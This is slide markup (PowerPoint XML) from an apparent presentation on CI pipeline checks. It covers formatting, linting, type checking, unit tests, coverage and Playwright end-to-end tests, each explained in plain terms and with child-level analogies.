                  <a:srgbClr val="E8E0F7"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: all six</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="50" name="Connector 50"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7566660" y="4138930"/>
            <a:ext cx="0" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Artifact"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4641850"/>
            <a:ext cx="1691640" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F4F4F6"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="6E3CBE"/>
            </a:solidFill>
            <a:prstDash val="dash"/>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52" name="Icon 52" descr="Package"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="4852162"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4705858"/>
            <a:ext cx="1051560" cy="73152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200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Package</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.tgz / .jar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Fact Fast feedback"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8732520" y="1581912"/>
            <a:ext cx="2907792" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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55" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="1737360"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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56" name="Icon 56" descr="Zap"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId10"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8988918" y="1838310"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Text 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9418320" y="1737360"/>
            <a:ext cx="2148840" cy="420624"/>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Fast feedback</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Text 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="2203704"/>
            <a:ext cx="2651760" cy="5943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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gates run side by side: wall time is about the slowest job, not the sum.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Fact Clear failure"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8732520" y="3046349"/>
            <a:ext cx="2907792" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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60" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="3201797"/>
            <a:ext cx="420624" cy="420624"/>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61" name="Icon 61" descr="CircleCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId11"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8988918" y="3302747"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Text 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9418320" y="3201797"/>
            <a:ext cx="2148840" cy="420624"/>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Clear failure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="3668141"/>
            <a:ext cx="2651760" cy="5943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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The PR checks list names the gate that failed, with its own log.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Fact Reports kept"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8732520" y="4510786"/>
            <a:ext cx="2907792" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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65" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="4666234"/>
            <a:ext cx="420624" cy="420624"/>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66" name="Icon 66" descr="Upload"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId12"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8988918" y="4767184"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Text 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9418320" y="4666234"/>
            <a:ext cx="2148840" cy="420624"/>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Reports kept</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Text 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="5132578"/>
            <a:ext cx="2651760" cy="5943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a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Test reports and Playwright traces are kept even when tests fail.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="69" name="Connector 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F6A04E9-FEE9-E4B1-5793-F56859232A55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="4734560"/>
            <a:ext cx="292608" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Job E2E test">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC84A5B0-A2F9-D871-D552-28E8F8346A61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017520" y="4437380"/>
            <a:ext cx="3154680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12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71" name="Icon circle">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C38C26D8-5822-7951-33F2-306C40B5C4B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3126740" y="4505960"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D7261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73" name="Text 35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BFC3329F-4F5C-CB94-ADF1-F76DD629DBF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="4469130"/>
            <a:ext cx="2377440" cy="310896"/>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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E2E test</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Text 36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91F51F5A-0A89-3F71-E0CE-EE176975A47A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="4761230"/>
            <a:ext cx="2377440" cy="25603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a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Playwright · Playwright Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="75" name="Connector 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4C1D8404-A45F-FF69-41A5-D429E98347B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200140" y="4734560"/>
            <a:ext cx="246888" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="77" name="Icon 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01738285-805D-5D29-89E9-6336CE5EDDD3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId13" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237230" y="4615815"/>
            <a:ext cx="237744" cy="2377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What each check does: code quality</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fr-FR" sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Six checks, six different questions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>about the same code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="444114367"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="1481328"/>
          <a:ext cx="11091672" cy="4297680"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1645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59152">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20004"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Check</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What it is</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Main purpose</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Output</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Explain it to a 5-year-old</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="685800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="6E3CBE"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Format check</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Checks the layout of the code: spaces, line breaks, quotes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Every file looks the same, so reviews focus on logic</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Pass/fail + files to fix (auto-fix with format)</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Are the toys lined up neatly on the shelf?</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="685800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0A9BCD"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Lint</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Reads the code looking for bad patterns and likely bugs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Catch mistakes and bad habits before they run</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Warnings/errors with file:line and rule name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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>A teacher says: you forgot to color the sun!</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="685800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="26AF72"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Typecheck</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Checks every value is used as the right kind (number, text...)</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Stop mixing up kinds of data before the code runs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Type errors, e.g. "string is not a number"</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>The square block goes in the square hole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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="685800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F5B400"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Unit test</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Small programs that run our code with known inputs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Prove the code gives the right answer, today and later</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Passed/failed tests + JUnit XML report</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ask 2 + 2 and check the answer is 4</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="685800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F06400"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Coverage</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Measures which lines the tests actually ran</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Find code no test touches; gate at 80%</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Percentage + HTML report of untested lines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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Did you look for teddy in every room, or only the kitchen?</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85800">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="D7261E"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>E2E test</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" b="1" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="D7261E"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>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i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Drives the real app in a browser, like a user</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="000000"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>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i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Prove UI, API and logic work together</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="000000"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>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i="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Pass/fail + HTML report, screenshots, traces</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="0" i="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="000000"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>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i="1">
                          <a:solidFill>
                            <a:srgbClr val="3A3A3A"/>
                          </a:solidFill>
                          <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                        </a:rPr>
                        <a:t>Press the buttons: does the toy car really drive?</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="0" i="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="3A3A3A"/>
                        </a:solidFill>
                        <a:latin typeface="Meiryo UI" panose="020B0604030504040204" pitchFamily="34" charset="-128"/>
                      </a:endParaRPr>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409493388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What each check does: security and compliance</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Our code, other people's code, the pipeline itself, and the law</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2657694405"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="1481328"/>
          <a:ext cx="11091672" cy="4297680"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1645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359152">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20004"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="411480">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Check</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What it is</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Main purpose</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Output</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Explain it to a 5-year-old</a:t>
                      </a:r>
